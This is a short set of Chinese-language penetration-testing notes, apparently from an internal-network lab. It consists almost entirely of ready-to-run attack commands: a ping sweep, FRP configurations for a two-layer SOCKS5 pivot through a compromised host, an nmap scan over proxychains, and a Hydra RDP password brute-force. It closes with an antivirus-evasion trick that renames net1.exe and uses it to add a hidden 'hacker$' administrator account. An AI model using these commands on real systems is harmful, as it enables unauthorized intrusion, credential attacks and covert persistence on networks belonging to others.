探测存活主机：

```
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.200.%I | findstr "TTL"  >> 1.txt
```

---

frp 两层代理：

第一层：

FRPS（Server IP：10.11.11.171）:

```
[common]
bind_port = 5001
```

FRPC:

```
[common]
server_addr = 10.11.11.171 （我自己的电脑的IP，这个程序放到了IP为192.168.2.100的机器上运行，也就是和外网相连的机器）
server_port = 5001

[ssh]
type = tcp
remote_port = 9998
plugin = socks5
```

第二层：

FRPS：

```
[common]
bind_port = 5001
```

FRPC （这个放到了第一二层交界的电脑上运行，以进入第二层内网，属于是取巧的做法）:

```
[common]
tls_enable = true
server_addr = 192.168.2.100 （把内外网相连的机器作为跳板）
server_port = 5001

[plugin_socks5]
type = tcp
remote_port = 9998
plugin = socks5
```

---

Nmap 扫描命令：

```
proxychains4 nmap -Pn -sT -p80,135,445,3389 192.168.2.150
```

Hydra RDP密码爆破：

```
hydra -L '/root/Desktop/Tools/fuzzDicts/userNameDict/top500.txt' -P '/root/Desktop/Tools/fuzzDicts/passwordDict/top500.txt' rdp://192.168.2.150 -t 1 -V
```

绕杀软添加用户：

```
cd C:\Windows\System32

copy net1.exe net2.txt

net2.txt user hacker$ admin /add  //添加隐藏用户

net2.txt localgroup administrators hacker$ /add   //加入到管理员组中
```



